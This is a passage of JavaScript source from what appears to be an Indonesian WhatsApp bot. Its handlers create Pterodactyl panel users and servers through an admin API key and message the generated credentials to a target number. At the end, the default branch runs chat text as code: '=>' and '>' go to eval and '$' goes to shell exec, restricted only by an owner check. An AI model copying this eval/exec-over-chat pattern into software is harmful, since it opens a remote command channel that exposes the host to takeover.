 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '4gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "4024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '5gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "5024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '1gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "1024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '2gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "2024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '3gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "3024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '4gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "4024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '5gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "5024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case 'addowner':
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner dan Pengguna Premium');
 
 // Memeriksa apakah nomor yang diberikan ada
 if (!q) return m.reply('⚠️ Masukkan nomor yang ingin ditambahkan sebagai owner.\nContoh: .addowner 6281234567890');
 
 // Cek jika nomor sudah ada dalam daftar owner
 if (global.owner.includes(q)) {
 return m.reply(`❌ Nomor ${q} sudah ada dalam daftar owner.`);
 }
 
 // Menambahkan nomor ke daftar global.owner
 global.owner.push(q);
 
 // Menyimpan perubahan ke dalam file settings.js
 fs.writeFileSync(settingsPath, `global.owner = ${JSON.stringify(global.owner, null, 2)}\n`);
 
 m.reply(`✅ Nomor ${q} berhasil ditambahkan ke daftar owner.`);
 break;

case 'delowner':
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner dan Pengguna Premium');
 
 if (!q) return m.reply('⚠️ Masukkan nomor yang ingin dihapus dari daftar owner.\nContoh: .delowner 6281234567890');
 
 // Cek jika nomor ada dalam daftar owner
 if (!global.owner.includes(q)) {
 return m.reply(`❌ Nomor ${q} tidak ditemukan dalam daftar owner.`);
 }

 // Menghapus nomor dari daftar owner
 global.owner = global.owner.filter(owner => owner !== q);

 // Menyimpan perubahan ke dalam file settings.js
 fs.writeFileSync(settingsPath, `global.owner = ${JSON.stringify(global.owner, null, 2)}\n`);

 m.reply(`✅ Nomor ${q} berhasil dihapus dari daftar owner.`);
 break;

case 'listowner':
 if (global.owner.length === 0) return m.reply('📋 Daftar owner kosong.');

 let ownerList = '📋 *Daftar Owner* 📋\n\n';
 global.owner.forEach((num, i) => {
 ownerList += `${i + 1}. ${num}\n`;
 });

 m.reply(ownerList.trim());
 break;

case 'hd': {
 if (!m.quoted) return m.reply("Balas pesan gambar yang ingin diubah menjadi resolusi tinggi dengan perintah ini.");
 if (!/image/.test(m.quoted.mtype)) return m.reply("Pesan yang dibalas bukan gambar!");

 try {
 // Mengambil media dari pesan yang di-quote
 let media = await Aanz.downloadMediaMessage(m.quoted);
 if (!media) return m.reply("Gagal mengunduh gambar.");

 // Kirim ulang gambar dengan resolusi tinggi
 await Aanz.sendMessage(m.chat, {
 image: media,
 caption: "Berikut gambar dengan resolusi tinggi."
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("Terjadi kesalahan saat memproses gambar.");
 }
 break;
}

default:
   
    
                
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
	require('fs').unwatchFile(file)
	console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
	delete require.cache[file]
	require(file)
})

